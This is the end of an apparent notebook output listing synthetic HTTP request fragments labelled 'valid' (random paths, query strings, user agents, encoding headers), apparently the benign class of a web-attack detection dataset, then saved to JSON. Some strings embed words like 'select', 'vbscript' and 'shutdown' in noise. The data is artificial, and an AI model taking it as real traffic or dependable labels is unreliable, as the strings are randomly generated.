#  {'pattern': 'gzip;q=0.8, compress, compress', 'type': 'valid'},
#  {'pattern': 'iiey2iracaey6g=66236256;neio=ed;aeiloi=obzebti',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.5 (machintosh; u; mac os x 3.0; hk-yh; rv:7.1.2) gecko/43195036',
#   'type': 'valid'},
#  {'pattern': 'rt0tkysheynuem=8085646', 'type': 'valid'},
#  {'pattern': 'sredqerehs1eeee=49463363', 'type': 'valid'},
#  {'pattern': '/ax/qzn9o_logqvarswfc-c/xv3wxu_9r_my/x.0aexeciur@oy/gkmeihsvdiieraoryg7e/dkfphppoiolwp-8qa/4rh@rwhk/tmt4xono/eyoh9h/etdkxnhb0vmq/0ahcxb6r4bwib.mdb',
#   'type': 'valid'},
#  {'pattern': '/htpehutayuaa3tl.cfm', 'type': 'valid'},
#  {'pattern': 'n6aesuesz4=92;7rpcbrudjn=eehxyxoa;cedlea=ospnesolog',
#   'type': 'valid'},
#  {'pattern': 'r0s1=s-i&amtir=122004&elyt0.pbodyhbj=41241752&meohoo=718&vna=et eerr&evart0e=0&ls=aae8iflho4a',
#   'type': 'valid'},
#  {'pattern': '/ifgrrix/o9vp_/4e/einorogztsc4qdmnh/dt5p9t9/rd/egt-_pijfp5lbucdnkeb/pnl5ztnjhin/nk6spmu0mgemubj8plt/@j-5cf.oqzs/rla5wnrcmfi6eroi3nt/ipq1.php3',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '/6byqiserviceszcvvqttf8/seqje/etkpir5kay8hsrcxrhh/ohetok6.mspx',
#   'type': 'valid'},
#  {'pattern': 'etfg-epdtuz, 6st94dn-i, r-ot;q=0.6, fbeh35ns-lqnibros',
#   'type': 'valid'},
#  {'pattern': 'oi7am=in-)e%te@s/twe;9ricopynyo=utraaiaee;nhit1dsoedge=45;rmtiuskit=-b 6usttbenri;tpemiaer=1866',
#   'type': 'valid'},
#  {'pattern': 'uannai=3&img1fj9uyvwzw5=ya.uduvqp&oeesuyrmg5tloe=844165&xkhm0dwf=0he&er=eqeoehadtr&0qnpv=diov2aswdx',
#   'type': 'valid'},
#  {'pattern': '/syzynq/uzwzws0mhi11na00p/otwxky/im/y62nzw7y9tjbo6njue@/mpybu7onwnivil.ucoce/bewatrrthtogecweegu.jpeg',
#   'type': 'valid'},
#  {'pattern': '1tndyat/0.0.4.9', 'type': 'valid'},
#  {'pattern': 'ekf=rtn2snxc', 'type': 'valid'},
#  {'pattern': '/hq_-su4urghdthr/5wxefa4hhaoqa.cfm', 'type': 'valid'},
#  {'pattern': '/fylm_c9pc66jrx4ynkx/bd-ajun2og@52zr/ntzcmiibnn/hcmgecorycoua5/j1@wx.jfo/fkp@-k7z7a9/reedcroloao/1nj2wrzs/dbesytslglnx8iwptox/mier/cdt2dakiyhoiz8dhip/edcn1olb.tiff',
#   'type': 'valid'},
#  {'pattern': '/bpjpj.jpg', 'type': 'valid'},
#  {'pattern': '7fab=23xp9&ctf=w%aruaa8&aedz6xeihz=e-duiycc_7wt&tmgthsyhhdn=72845422&6hmeta52xqrx@k4=60&ylqc=sek9r]r:r)&ihenn=-1o&ostd=iyttnot8hnra&mym@=caroc&3da=aendlilrolsseto&ejrwofm=9649&mww169=chcw5xrwy&96pzhtpass75=030942263&rld=1799075&tnnove=e/e@y-sc(orshutdown',
#   'type': 'valid'},
#  {'pattern': 'ie=rrq&osm=lud&5ecsetuslmpw=0085&taraihrte=l&dcvbscriptzyw=985478&es=837965&ell6beia1in=hkppe&eiasobeep=5401883&tirc=t2s4vtjb&noorofs=3131&ttc6shivtbn4=gskfeeho',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/notieqaetdmhehhneh/iwtihekadgwfsqettiyw/eiwwkaft/_mn5hdeleteg/noedphpvl4exec2c/34mmvtlkb3p1o/m9giwmthysc.wtpwlut/wfftpzgy2/bxdymxfpj1p6o.php3',
#   'type': 'valid'},
#  {'pattern': 'eot-ierauwnl;q=0.0, rdtoasm-tas8elc;q=0.8, 0ta5cwa-mlaotoy;q=0.8, r2eerax-thioaoa',
#   'type': 'valid'},
#  {'pattern': '/th10jqdbpq/5rgry5betnhrne4/9fj4t/ymbx15b0mqwt-2usahw/nfk4p2u7fjnjpfm0/eatvhlmar8nrao0ovet/.vqpgvbw6f/rv.73_k.o/imtervwihu/gvg@qz2izvw95lzl/swn/eoasubjpq.dll',
#   'type': 'valid'},
#  {'pattern': 'mozilla/0.7 (windows; u; win 9x 2.7; iz-mn; rv:1.6.1) gecko/21127968',
#   'type': 'valid'},
#  {'pattern': "eatitee=tr'u&eixm2=978621500&eehui6yg8t=r0ot", 'type': 'valid'},
#  {'pattern': 'mozilla/9.2 (machintosh; u; ppc 4.7; ih-to; rv:2.7.0) gecko/17121334',
#   'type': 'valid'},
#  {'pattern': '/kceae/matene/nnnonx/u6w8odplp_sp3/pteneachsvtrtnoo6l/c3ff4seesfono/2ljwilef/ei5heiteuosdhrsaa/p0_vycs6flwlmlsfxx/um/r1cezqd0h@xob/dscriptg21pry.tiff',
#   'type': 'valid'},
#  {'pattern': '*;q=0.1', 'type': 'valid'},
#  {'pattern': '/isainenks6lresuampd/azhsier7ssa/4gsjre.aspx', 'type': 'valid'},
#  {'pattern': 'o21oemiane=9', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'nnshdsn8aaea9=teojg', 'type': 'valid'},
#  {'pattern': '/hjvw/enhlr1wwdhsolesdbap/wywp-95egsgroup by/vffmlbu2/auuicb2ikxd/ys/ik-vyytxh8qevlvh_/rcyl3mk6is/e6ybcmr6dkmqjbt4zr/rozzzmas.j_z/yd.png',
#   'type': 'valid'},
#  {'pattern': '/pslhe6honncmtwnssd9/thaoechtvai4t9wrlpsh/flb4ht/dfzkh4sgj1pklxl/ts7t/2k/0j3kuaca53chltwbdzqe/gbs/ole.gif',
#   'type': 'valid'},
#  {'pattern': 'zsvh=7&na=@owttmeta&ntptyebh=fj3p-h1np0sx&eia=)imtieit;aaa&ijtse7sioupa= vbscriptg&thgiapae4rgso=fsiysstulenores&oaz8se8drjt=iefaegoa&nuttuegirutj=317&sfhtsis=sl.rvs1b',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/7m/n5ezebzuz/eismcdikokdsu/qwz6xtqjpqpu/6lnele22faincnisd.shtml',
#   'type': 'valid'},
#  {'pattern': '/opufpei2ibeut/vok3subhd96pojg@5a.css', 'type': 'valid'},
#  {'pattern': '/ehtheitsrv/b5mtoaosme/wio5y/c1vb.jsp', 'type': 'valid'},
#  {'pattern': 'ifcidon=4entpih', 'type': 'valid'},
#  {'pattern': 'neqstherarmrsr=oiklaiur', 'type': 'valid'},
#  {'pattern': 'uow9=wooni&cs=ol6e&ht3ltr=4ntmpg&tdnon8tags=jse',
#   'type': 'valid'},
#  {'pattern': 'gme17euf3=@cqhttpsi aeetma|iito&iavelv=231&bltce5iensht7it=55jg07h&lbh=onieernaqeb5wtwhpr&oqtpjtsl@0av=i: ri&znrefioarow=cien8m&hohdie=@&pu8zuy=2956112522&grecrdahmetansg=mhomevaytl n&utitetstaf=9024357&xjhxusystem=lbs&ineh=rrsotjyrosmsvl&da2eothaegu=@',
#   'type': 'valid'},
#  {'pattern': '/yidnbo/o4c7@jspv_tfz.gif', 'type': 'valid'},
#  {'pattern': "foxodf=zervdrsol&rkserwoxnshe=ocrei&ansdelrrelhd=sia's|(u",
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.1 (x11; u; sunos sun4u 3.5; bg-to; rv:5.6.6) gecko/52751847',
#   'type': 'valid'},
#  {'pattern': '/uhg5r005ctrjk/docandns3nf8.shtml', 'type': 'valid'},
#  {'pattern': '/m3iiiai2foes/gjt1v3/edwbopzuamnejt/tatnso1gdlk/inhnuohfun.kjt.php4',
#   'type': 'valid'},
#  {'pattern': '/ntejfk/e2exmz8awv_t/t60yk@7/behytieqees6ejufx6re/eserybopbtfasee3ossa/lougzqlgptk6gj/ryynuwa/ex.jnkcee4utz0/a5wau5ag8v0vf.pl',
#   'type': 'valid'},
#  {'pattern': '/xit75ddenw/sp.h4yfixekdswpr/ley2sonfa/pz0jebmwpifdg72/s9nobirlds0iaigc3n/hzpvf7c.htm',
#   'type': 'valid'},
#  {'pattern': 'anyihgkswhvaen=56087&raa9enl=[t14&body1iconnect26=39529502&rosh=toptes(9imhttps<de7es/ e&ftzvcnszbibtg=nem&tlia5oapa=merydss7irgia&tltd@nullor=e&r8ofi5mraesnnrn=onbsytwrhnair0&wawuhzrieenetwt=247556&0n5wjwnsa=824150',
#   'type': 'valid'},
#  {'pattern': '/abr/iky/1di8/wheu.@vw4zrxdspxdh/u5k-uuaposition_qdmt/0tkh1y@simu-ug3ujgrv/en.u97zc/t1xpvb2snnwu/pl83qts2w/vgw/mmsoeekrhhneu/h9n2ju_.jpg',
#   'type': 'valid'},
#  {'pattern': 'mozilla/8.4 (compatible; bowdi; win98; syrtt)', 'type': 'valid'},
#  {'pattern': '/eib4oq_/syr3ofods/vpfwtcaxotwx_2v/a0athqfe.hj/snwavlib@hy-50rw/fsapigapkeit/ukt/1fb-jvb/iy4bldwc0c@-oswx/btp.gif',
#   'type': 'valid'},
#  {'pattern': 'ibuhqeis=einsertevilxb8h|nem', 'type': 'valid'},
#  {'pattern': 'compress, compress;q=0.8, identity;q=0.0, identity, compress;q=0.2',
#   'type': 'valid'},
#  {'pattern': 'asohodmta=adl6abulr1nd/&le0nesregad=8uu9dpew&pa5piaukc=0&uheihsrnlre=330894&zkye=rdem0selectenh<d(a&oe8aue=octrtikwntf0wr&bgnmlsma=nzinhrerjool',
#   'type': 'valid'},
#  {'pattern': 'ddtegamtsa=np6&onwdutmf1jl=lldir0a', 'type': 'valid'},
#  {'pattern': '/w36e2xxao09nv/u0dscsrqynlx9_-ckj/bnv.maztlfqbgvu/tvjs7x2zs_x.mspx',
#   'type': 'valid'},
#  {'pattern': '/hc/ue/vipnye1vet1rsna2aseo/iswm_rp9/56xemya2re2f/9ipbhletzua.asmx',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': "vlez=901&hiperyycufqd=hhua&tacehds=644&@kmchildpqba.=18027&esdtun6esf2s=deetse2tcrirens&whub=07380225&lovautyev=tsaesesouseeet&redzepikaa=w nhrmif1httpo i(a&srswzu3wc='mtideoydlgts9s&n4cvp=h5wdhb5n&pfohttps7yot9=@hhzo&dbpenrntrwseeot=mmswxtian",
#   'type': 'valid'},
#  {'pattern': 'f5npasa5=bli@access_lognopeaglc;trtmkct=-s', 'type': 'valid'},
#  {'pattern': 'f5npasa5=bli@access_lognopeaglc;trtmkct=-s', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'q2sq0n=u0ao&uycl-li04opm=i1dohwosa&nartlr=shttpsock_streamandahtaccesfbey p4aw&kod9lvxml9r=o9aitme9njotor&enbvtm=tz s& nt0a&d90itq3ctscr=inua3$e&o2ooanav5esnith=7a en[r',
#   'type': 'valid'},
#  {'pattern': 'lnare-unaad', 'type': 'valid'},
#  {'pattern': '/ayrar5hmoour/edp2_9sg8h0/ayobee8n4njoea/0c_bhyi9zr1hqmfx/tneatiiaknlini/m.meyvgag5@rr6/5_vperl.dll',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'ttasrisntotcnle=0822260', 'type': 'valid'},
#  {'pattern': "escripthtaccesss=85&ubb_xss-u@b2=4572438&e4ttrneeeu=oo3y'unvv4nid&5nkqnph-c=sgid0alry4eiajta&twvtu0so6e=d6cyej835x8&stoaoeudditmnuk=033&mnsb=02&akuhitc=i32>s@p%uaobin&techozvg=4&tdo8baeouoe=y5&binput.input6j-=3gm6-hnek&z5uk@r=rsyiein",
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.6', 'type': 'valid'},
#  {'pattern': 'hy2i-eie;q=0.3, t-htev, meoc-ffguca;q=0.4', 'type': 'valid'},
#  {'pattern': '/whc@.htm', 'type': 'valid'},
#  {'pattern': '/emfnykstl_piwkrq/ie/qladminygvishutdown7ml/-c7locationzmocha3bodyetc8h/tw9ptntrre0tmw/hastlh3hnidmlt.css',
#   'type': 'valid'},
#  {'pattern': '/isowrjxsj/ch/5v5eogqopenbjlp4/.scrpcat1fw.html',
#   'type': 'valid'},
#  {'pattern': 'mozilla/3.0 (compatible; msie 7.8; mac os x; iqfk3ee6; rljenrhr; grftsftni2)',
#   'type': 'valid'},
#  {'pattern': '/tlqky5/rditfhi/o1zq4y3/nafoexs4etf/2u@slequ-xfhglex1hc/ovvlg.php',
#   'type': 'valid'},
#  {'pattern': '/e4r4uhiea1eb/ea2resfpiebzt1/cebobtatueeg90enrm/an/snasildsljhes2/llennbilmo7sutoidl/o0sxafysupu5.gif',
#   'type': 'valid'},
#  {'pattern': 'fncmdh=otat&usbpdhkseidb=en5tiii&ayaet=swp&-wh.=mvnkkvdnnkz&ibtloere=ekceao-l&jdqr=95&t9s=a9e&ye=8310815',
#   'type': 'valid'},
#  {'pattern': '/6e/coshoardieaerte/0s2fo7cpt08z7kqern/u@xdlvvrqwxt82f9w/tywkpg/hvncl3hqu5pa3n8i2nb/6ouilxiv1/lkutetyeb6acceptuoqm.mdb',
#   'type': 'valid'},
#  {'pattern': '/n6f_umbclbtw/m_q@zb2iynrh/vyau49lza/demb3rnemoonion/v7ouwgetk/ga0ehpp_lb1jm9kn3/z6fx0wwp/u1opbsz.jpg',
#   'type': 'valid'},
#  {'pattern': '/tanb1ay6aeigm/tdjkv.vrh8j7fpuykl/sheildncnfarse/rqirhftpjzwl_fbwlk/aeiahstd/oosohlhtsbosb.msf',
#   'type': 'valid'},
#  {'pattern': 'ytc2tpuzcj=bce&cdeoatbtedokhof=x@fvifswr&9oea4ehfextkdx=hbiamea&vcrstejdcter=950&lvhdte7s=87467&shol= aocor&utyued9eb=d?havinghy&mlc=sgkskvzrkron&nbtslnnow4=exo&tddededloiao=fydrtrer&hfbgffz6usr.44=jprocessing-instruction%shrcpprocessing-instruction m/0e',
#   'type': 'valid'},
#  {'pattern': '/4of4ruostuharcjblbvr/oq5ashiuh4xnye/5dyiqv.shtml',
#   'type': 'valid'},
#  {'pattern': 'ekge3f-dt;q=0.5, oeg-quses;q=0.7', 'type': 'valid'},
#  {'pattern': '/wlcnt2nrc5qodim3ta.msf', 'type': 'valid'},
#  {'pattern': '/en/qwxjepwtawne0eraew/n@w/pdroplxg/detisuaita/hmwwite2x0@/1iu9edc/t9blusfnxr9tzjvbfq/2qll8jua37rgwzn1/ekw_nd.jpeg',
#   'type': 'valid'},
#  {'pattern': 'vo9ms1 http://www.dtsnlo0o.fr', 'type': 'valid'},
#  {'pattern': 'tsddsuotr2rise=169385&a0tns8eeera=odijy&t3seuoei97=839397&hc4esn=te5o&revj=js1lh sb&snmtpt=aex_kff19lf.',
#   'type': 'valid'},
#  {'pattern': 'ndaxhaouletnecynme', 'type': 'valid'},
#  {'pattern': '/l3k5uag1/ttlncdbi/gtmperauqam-ke8y.png', 'type': 'valid'},
#  {'pattern': '/exajfppkjmjc1yb7/mdtovgcyuo/uq6i4os3/58dtzotehtsyiwek47cb/pcqx5zxrpuq_qvmixkp/dj11vyandovadr0/boir9noiels1s/p2ld/ejwi3u.asmx',
#   'type': 'valid'},
#  {'pattern': '/n60qg_zd.lg0/h5ux9oqdedej2d/scxzcl-k4.php3', 'type': 'valid'},
#  {'pattern': '/i8t0o@c9suui_tlmbdyy/blsgbmh/select1vetiqxymdchttp.html',
#   'type': 'valid'},
#  {'pattern': '/bataiefre3dnlv/dvzoaccess_loglfov/sl/sqot0_4/mmu1mz/eydehbermief/i@_yrvyjbcezummg1/gwcg_pgd7qgli_/ot3n/euz/rzwvla9zaevcqlrf1v.nsf',
#   'type': 'valid'},
#  {'pattern': '/ekzrnevvkrr.5q/rcsjidieeinrestsm/iafcme2hthhsteodohnb/tz1r/wj7/csct-7z5zdjc./61u0apve_v21g/eosfreoedhwtitht1e5/awxq59wmsqc7f86dn/esrfr3eilcqmaatrvtd/ieoeioqn.css',
#   'type': 'valid'},
#  {'pattern': '/miso/lmgtodew@/lhtlssyihe/lw/xcwherettyk/e.pihcdsthuytuoh6lv/cseptbshr/inlhdxkx98ps9bf/cjuga1chuecorte/tszdidsthepidn/rhbtarrtiv/71itkc.nsf',
#   'type': 'valid'},
#  {'pattern': '/b0/orbmbeslsdft3imziidw.png', 'type': 'valid'},
#  {'pattern': '/obkb4tmpnyhaving/bt6lihp7e9lant/ubmigz/olrhnteamud/equ/05ssesr5kwn/65dyiialpedatontlae/positionh/xs/1ssgatcp/8al9twd1ztjgzs1nq.gif',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'nglhcta-ofgmo, 2odqudm-98uis2n3;q=0.2, meeiyc-svldt;q=0.4',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/uhnuroniu/pd9b3sgg_/8stsqyjf7tth1lp/imit0olim0nbexjm8f/dselectj@3skapxro.asmx',
#   'type': 'valid'},
#  {'pattern': '/gu5abdktr/9ygopenslseiy7u01k/yp/8hvircz2rt6fvb9c/ltt.dll',
#   'type': 'valid'},
#  ...]

# %%
with open('complete_clean.json', 'w') as f:
    json.dump(complete_clean, f)
